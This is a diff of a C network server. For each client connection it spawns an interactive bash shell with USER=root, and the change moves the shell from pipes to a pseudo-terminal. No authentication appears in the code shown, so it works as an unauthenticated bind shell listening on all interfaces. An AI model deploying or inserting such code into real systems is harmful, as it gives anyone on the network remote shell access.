@@ -26,11 +26,12 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include <errno.h>
+#include <pty.h>
 
 struct client {
 	int fd;
-	int stdout_pipe[2];
-	int stdin_pipe[2];
+	int pty_master;
+	int pty_slave;
 	struct sockaddr_in saddr;
 	char ip_str[50];
 	struct client* next;
@@ -50,7 +51,7 @@ static inline void nonblock(const int fileno) {
 struct client* search_client(int fd) {
 	struct client* client = clients;
 	while(client) {
-		if(client->fd == fd || client->stdout_pipe[0] == fd) {
+		if(client->fd == fd || client->pty_master == fd) {
 			return client;
 		}
 		client = client->next;
@@ -70,7 +71,7 @@ void rebuild_fds() {
 	for(int i = 0; i < n_clients && client; i++) {
 		new_fds[i*2 + 1].fd = client->fd;
 		new_fds[i*2 + 1].events = POLLIN;
-		new_fds[i*2 + 2].fd = client->stdout_pipe[0];
+		new_fds[i*2 + 2].fd = client->pty_master;
 		new_fds[i*2 + 2].events = POLLIN;
 		client = client->next;
 	}
@@ -93,22 +94,32 @@ struct client* accept_connection() {
 	getnameinfo((struct sockaddr*)&client->saddr, sizeof(client->saddr),
 		client->ip_str, 50, NULL, 0, NI_NUMERICHOST);
 
-	printf("Accepted connection from %s:%d\n", client->ip_str, client->saddr.sin_port);
-	fflush(stdout);
-
-	if(pipe(client->stdout_pipe) != 0 || pipe(client->stdin_pipe) != 0) {
-		free(client);
+	if(openpty(&client->pty_master, &client->pty_slave, NULL, NULL, NULL) < 0) {
+		perror("openpty");
 		return NULL;
 	}
 
-	nonblock(client->stdout_pipe[0]);
+	printf("Connection from %s:%d, PTM %d, PTY %d\n", client->ip_str,
+		client->saddr.sin_port, client->pty_master, client->pty_slave);
+
+	fflush(stdout);
+
 	nonblock(client->fd);
+	nonblock(client->pty_slave);
 
 	int pid = fork();
+	if(pid < 0) {
+		perror("fork");
+		return NULL;
+	}
+
 	if(!pid) {
-		dup2(client->stdout_pipe[1], 1);
-		dup2(client->stdout_pipe[1], 2);
-		dup2(client->stdin_pipe[0], 0);
+		close(1);
+		close(2);
+		close(0);
+		dup2(client->pty_slave, 1);
+		dup2(client->pty_slave, 2);
+		dup2(client->pty_slave, 0);
 
 		char* login_argv[] = { "bash", "-i", NULL };
 		char* login_env[] = { "USER=root", NULL };
@@ -136,7 +147,7 @@ int copy(int from, int to) {
 int main (int argc, char *argv[]) {
 	struct sockaddr_in server;
 
-	server_fd = socket(AF_INET, SOCK_STREAM, 0);
+	server_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
 	if (server_fd < 0) {
 		perror("Could not create socket");
 		return -1;
@@ -147,7 +158,7 @@ int main (int argc, char *argv[]) {
 	server.sin_addr.s_addr = htonl(INADDR_ANY);
 
 	int opt_val = 1;
-	setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt_val, sizeof opt_val);
+	setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt_val, sizeof(opt_val));
 
 	if(bind(server_fd, (struct sockaddr*)&server, sizeof(server)) < 0) {
 		perror("Could not bind socket");
@@ -177,6 +188,10 @@ int main (int argc, char *argv[]) {
 			int fd = fds[i].fd;
 			if(fd == server_fd) {
 				struct client* client = accept_connection();
+				if(!client) {
+					continue;
+				}
+
 				client->next = clients;
 				clients = client;
 				n_clients++;
@@ -189,9 +204,9 @@ int main (int argc, char *argv[]) {
 
 				int copy_result = -1;
 				if(fd == client->fd) {
-					copy_result = copy(client->fd, client->stdin_pipe[1]);
-				} else if(fd == client->stdout_pipe[0]) {
-					copy_result = copy(client->stdout_pipe[0], client->fd);
+					copy_result = copy(client->fd, client->pty_master);
+				} else if(fd == client->pty_master) {
+					copy_result = copy(client->pty_master, client->fd);
 				}
 
 				if(copy_result < 0) {
